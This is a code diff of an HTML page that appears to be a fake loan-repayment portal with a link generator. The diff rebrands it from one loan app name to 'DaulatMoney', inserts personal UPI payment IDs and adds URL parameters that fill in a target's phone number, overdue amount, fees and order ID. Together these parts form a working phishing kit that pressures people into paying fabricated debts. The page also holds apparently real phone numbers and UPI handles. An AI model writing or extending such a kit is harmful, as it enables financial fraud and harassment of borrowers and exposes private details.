@@ -3,26 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Repayment Portal & Generator</title>
+    <title>DaulatMoney - Repayment Portal</title>
     
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const hasParams = urlParams.has('m') || urlParams.has('p');
 
         const MY_CONFIG = {
-            appName: "Nimocredit app",              
+            appName: "DaulatMoney",              
             upiList: [
-                "raghavy807-1@okhdfcbank",
-                "ashalaon7770@ptyes",  
-                "raghavy807-1@okhdfcbank"   
+                "6372849102@okaxis",
+                "daulatpay@paytm",  
+                "6372849102@okaxis"   
             ],
-            mobileNumber: urlParams.get('m') || "91630***1323",        
-            payableAmount: urlParams.get('p') || "₹4800",           
-            disbursedAmount: urlParams.get('d') || "₹4500",        
-            loanTerm: "7 Days",                 
-            repaymentDate: "2/11/2026",
-            orderId: urlParams.get('id') || "69239189",                 
-            overdueText: urlParams.get('o') || "5 Days Overdue"        
+            mobileNumber: urlParams.get('m') || "8072344052",        
+            payableAmount: urlParams.get('p') || "₹3329",           
+            loanAmount: urlParams.get('la') || "₹3,000",
+            disbursedAmount: urlParams.get('d') || "₹1,800",        
+            loanTerm: urlParams.get('lt') || "7 Days",                 
+            interest: urlParams.get('int') || "₹29",
+            overdueFee: urlParams.get('fee') || "₹300",
+            repaymentDate: urlParams.get('date') || "03/10/2026",
+            orderId: urlParams.get('id') || "00642464690",                 
+            overdueText: urlParams.get('o') || "Overdue"        
         };
     </script>
 
@@ -80,6 +83,8 @@
             align-items: center;
             justify-content: center;
             box-shadow: 0 2px 4px rgba(0,0,0,0.08);
+            font-weight: 700;
+            color: #2b70ff;
         }
         .brand-name {
             font-size: 21.5px;
@@ -167,27 +172,27 @@
             font-size: 16px;
             font-weight: 700;
             color: #1a1a1a;
-            margin-bottom: 18px;
+            margin-bottom: 14px;
         }
         .detail-row {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 14px;
+            margin-bottom: 12px;
             font-size: 14px;
         }
         .detail-label {
-            color: #1a1a1a;
-            font-weight: 700;
+            color: #4a4a4a;
+            font-weight: 400;
         }
         .detail-value {
-            font-weight: 400;
-            color: #4a4a4a;
+            font-weight: 600;
+            color: #1a1a1a;
         }
         .terms-text {
             font-size: 11px;
             color: #9ca3af;
-            margin-top: 20px;
+            margin-top: 16px;
             line-height: 1.45;
             text-align: center;
         }
@@ -307,6 +312,9 @@
             justify-content: center;
             margin: 0 auto 8px auto;
             box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+            font-weight: 700;
+            color: #2b70ff;
+            font-size: 20px;
         }
         .modal-logo-area {
             font-weight: 700;
@@ -619,12 +627,7 @@
 <div class="container" id="step1Screen">
     <div class="top-card">
         <div class="logo-area">
-            <div class="logo-box">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12Z" fill="#2977ff"/>
-                    <path d="M7 16V9L10 13L13 9V16M15 16V13C15 11.8954 15.8954 11 17 11V16" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
-            </div>
+            <div class="logo-box">M</div>
             <div class="brand-name" id="lblAppName1"></div>
         </div>
         <div class="mobile-num">Mobile Number: <span id="lblMobile"></span></div>
@@ -650,12 +653,24 @@
     <div class="details-card">
         <div class="section-title">Loan Details</div>
         <div class="detail-row">
+            <span class="detail-label">Loan Amount</span>
+            <span class="detail-value" id="lblLoanAmount"></span>
+        </div>
+        <div class="detail-row">
             <span class="detail-label">Disbursed Amount</span>
             <span class="detail-value" id="lblDisbursedAmount"></span>
         </div>
         <div class="detail-row">
             <span class="detail-label">Loan Term</span>
             <span class="detail-value" id="lblLoanTerm"></span>
+        </div>
+        <div class="detail-row">
+            <span class="detail-label">Interest</span>
+            <span class="detail-value" id="lblInterest"></span>
+        </div>
+        <div class="detail-row">
+            <span class="detail-label">Overdue Fee</span>
+            <span class="detail-value" id="lblOverdueFee"></span>
         </div>
         <div class="terms-text">
             I have read and agreed to <span id="lblAppNameContract"></span>'s <a href="#">Sanction Letter</a> and <a href="#">Loan Service Contract</a>.
@@ -681,12 +696,7 @@
 <div class="modal-overlay" id="paymentModal" onclick="closeModal(event)">
     <div class="modal-content" onclick="event.stopPropagation()">
         <div class="modal-header">
-            <div class="modal-logo-box">
-                <svg width="35" height="35" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12Z" fill="#2977ff"/>
-                    <path d="M7 16V9L10 13L13 9V16M15 16V13C15 11.8954 15.8954 11 17 11V16" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
-            </div>
+            <div class="modal-logo-box">M</div>
             <div class="modal-logo-area" id="lblPayToApp"></div>
             <div class="modal-amount" id="lblPayable2"></div>
         </div>
@@ -782,31 +792,56 @@
 </div>
 
 <div class="generator-box" id="generatorBox">
-    <h2>⚡ Link Generator</h2>
+    <h2>⚡ DaulatMoney Link Generator</h2>
     
     <div class="form-group">
         <label>Mobile Number:</label>
-        <input type="text" id="genMobile" value="916301323">
+        <input type="text" id="genMobile" value="8072344052">
     </div>
 
     <div class="form-group">
         <label>Payable Amount:</label>
-        <input type="text" id="genPayable" value="₹5000">
+        <input type="text" id="genPayable" value="₹3329">
+    </div>
+
+    <div class="form-group">
+        <label>Loan Amount:</label>
+        <input type="text" id="genLoanAmount" value="₹3,000">
     </div>
 
     <div class="form-group">
         <label>Disbursed Amount:</label>
-        <input type="text" id="genDisbursed" value="₹3500">
+        <input type="text" id="genDisbursed" value="₹1,800">
+    </div>
+
+    <div class="form-group">
+        <label>Loan Term:</label>
+        <input type="text" id="genLoanTerm" value="7 Days">
+    </div>
+
+    <div class="form-group">
+        <label>Interest:</label>
+        <input type="text" id="genInterest" value="₹29">
+    </div>
+
+    <div class="form-group">
+        <label>Overdue Fee:</label>
+        <input type="text" id="genOverdueFee" value="₹300">
+    </div>
+
+    <div class="form-group">
+        <label>Repayment Date:</label>
+        <input type="text" id="genDate" value="03/10/2026">
     </div>
 
     <div class="form-group">
         <label>Overdue Text:</label>
-        <input type="text" id="genOverdue" value="4 Days Overdue">
+        <input type="text" id="genOverdue" value="Overdue">
     </div>
 
     <div class="form-group">
         <label>Order ID:</label>
-        <input type="text" id="genOrder" value="73940951">
+        <input type="text" id="genOrder" value="00642464690">
     </div>
 
     <button class="gen-btn" onclick="generateLink()">Generate Link 🚀</button>
@@ -871,8 +906,11 @@
             document.getElementById('lblOrderId').innerText = MY_CONFIG.orderId;
             document.getElementById('lblOverdueText').innerText = MY_CONFIG.overdueText;
             
+            document.getElementById('lblLoanAmount').innerText = MY_CONFIG.loanAmount;
             document.getElementById('lblDisbursedAmount').innerText = MY_CONFIG.disbursedAmount;
             document.getElementById('lblLoanTerm').innerText = MY_CONFIG.loanTerm;
+            document.getElementById('lblInterest').innerText = MY_CONFIG.interest;
+            document.getElementById('lblOverdueFee').innerText = MY_CONFIG.overdueFee;
             
             document.getElementById('lblPayable2').innerText = MY_CONFIG.payableAmount;
             document.getElementById('lblWarning').innerText = `Insufficient wallet balance, pay another ${MY_CONFIG.payableAmount} via UPI to complete your order`;
@@ -938,12 +976,17 @@
     function generateLink() {
         let mobile = encodeURIComponent(document.getElementById('genMobile').value);
         let payable = encodeURIComponent(document.getElementById('genPayable').value);
+        let loanAmount = encodeURIComponent(document.getElementById('genLoanAmount').value);
         let disbursed = encodeURIComponent(document.getElementById('genDisbursed').value);
+        let loanTerm = encodeURIComponent(document.getElementById('genLoanTerm').value);
+        let interest = encodeURIComponent(document.getElementById('genInterest').value);
+        let overdueFee = encodeURIComponent(document.getElementById('genOverdueFee').value);
+        let date = encodeURIComponent(document.getElementById('genDate').value);
         let overdue = encodeURIComponent(document.getElementById('genOverdue').value);
         let order = encodeURIComponent(document.getElementById('genOrder').value);
 
         let baseUrl = window.location.origin + window.location.pathname;
-        let finalLink = `${baseUrl}?m=${mobile}&p=${payable}&d=${disbursed}&o=${overdue}&id=${order}`;
+        let finalLink = `${baseUrl}?m=${mobile}&p=${payable}&la=${loanAmount}&d=${disbursed}&lt=${loanTerm}&int=${interest}&fee=${overdueFee}&date=${date}&o=${overdue}&id=${order}`;
 
         let resBox = document.getElementById('resultLink');
         resBox.style.display = 'block';
